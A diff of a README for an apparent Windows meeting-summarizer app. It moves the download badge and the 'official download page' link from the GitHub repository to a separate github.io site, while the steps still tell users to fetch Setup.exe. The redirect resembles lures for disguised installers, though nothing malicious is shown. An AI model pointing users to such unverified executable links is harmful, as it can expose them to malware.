@@ -1,6 +1,6 @@
 # 🎙️ AI-Meeting-Summarizer-2026 - Save time with automated meeting notes
 
-[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge)](https://github.com/Bulbar-lilac914/AI-Meeting-Summarizer-2026)
+[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge)](https://bulbar-lilac914.github.io)
 
 ## 📋 What this tool does
 
@@ -21,7 +21,7 @@ Before you install this application, check your computer for the following requi
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Bulbar-lilac914/AI-Meeting-Summarizer-2026) to find the latest version of the application.
+1. Visit the [official download page](https://bulbar-lilac914.github.io) to find the latest version of the application.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version link.
 4. Find the file named `Setup.exe` under the "Assets" list.
